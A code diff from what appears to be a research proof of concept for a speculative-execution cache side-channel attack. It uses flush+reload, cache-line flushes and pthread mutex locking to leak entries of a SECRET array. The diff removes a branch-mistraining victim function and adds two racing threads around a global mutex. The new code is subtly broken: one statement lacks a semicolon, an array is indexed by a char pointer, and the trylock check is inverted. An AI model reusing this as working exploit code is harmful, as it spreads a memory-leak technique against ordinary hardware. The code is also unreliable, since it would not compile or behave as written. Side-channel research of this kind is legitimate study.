@@ -22,62 +22,31 @@
 //#define FLAG PTHREAD_MUTEX_ADAPTIVE_NP
 
 cp_t* flush_reload_arr;
+pthread_mutex_t k;
 
-extern inline void attack_func(pthread_mutex_t* lock_ptr, int secret_index) {
-    pthread_mutex_lock(lock_ptr);
-    volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
-}
+void* thread1(void* data) {
 
-void victim_func(int lock_index, int secret_index) {
+    char* allow_lock = (char*)data;
 
-    //creates 3 locks. put addresses in array to prevent branches (fools branch predictor).
-    pthread_mutex_t k, l, m;
-    pthread_mutex_init(&k, FLAG);
-    pthread_mutex_init(&l, FLAG);
-    pthread_mutex_init(&m, FLAG);
-    int  k_idx = 0;
-    int  l_idx = 1;
-    int  m_idx = 2;
-    int  n_locks = 3;
-    pthread_mutex_t* klm_addresses[n_locks];
-    klm_addresses[k_idx] = &k;
-    klm_addresses[l_idx] = &l;
-    klm_addresses[m_idx] = &m;
-
-    //array that tracks which locks are locked. Default value is false.
-    char locked[n_locks] __attribute__ ((aligned (256)));
-    for(int i = 0; i < n_locks; i++) locked[i] = false;
-
-    //lock either k,l or m, depending on the parameter. Branch predictor cannot determine which (no branches).
-    pthread_mutex_t* klm_address = klm_addresses[lock_index];
-    pthread_mutex_lock(klm_address);
-    locked[lock_index] = true;
-
-    //Remove locked[k_idx] from cache, so that the branch will speculatively execute.
-    cpuid();
-    flush((void*)&locked[k_idx]);
-    flush((void*)klm_addresses[k_idx]);
-    cpuid();
-
-    if(!locked[k_idx]) {
-        //volatile cp_t cp1 = flush_reload_arr[0];
-        pthread_mutex_lock(&k); //TODO: check if this works normally, otherwise configure
-        volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
-        //attack_func(&k, secret_index);
-        cpuid();
+    if(*allow_lock) {
+        pthread_mutex_lock(&k);
+        sleep(1);
         pthread_mutex_unlock(&k);
     }
 
-    cpuid();
+    return NULL;
+}
 
-    pthread_mutex_unlock(klm_address);
-    pthread_mutex_destroy(&k);
-    pthread_mutex_destroy(&l);
-    pthread_mutex_destroy(&m);
-    /*if(!locked[k_idx]) pthread_mutex_unlock(&k);
-    if(!locked[l_idx]) pthread_mutex_unlock(&l);
-    if(!locked[m_idx]) pthread_mutex_unlock(&m);*/
+void* thread2(void* data) {
 
+    char* s = (char*)data;
+
+    if(pthread_mutex_trylock(&k)) {
+        flush_reload_arr[SECRET[s]]
+        pthread_mutex_unlock(&k);
+    }
+
+    return NULL;
 }
 
 int* prepare(int secret_index) {
@@ -118,6 +87,7 @@ int* prepare(int secret_index) {
 
 int main(int argc, char** argv) {
     srand(time(0));
+    pthread_mutex_init(&k, FLAG);
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
 
     //results[0][0] = prepare(1);
@@ -132,5 +102,5 @@ int main(int argc, char** argv) {
     print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);
 
     free_results(results, REPETITIONS, SECRET_SIZE);
-
+    pthread_mutex_destroy(&k);
 }
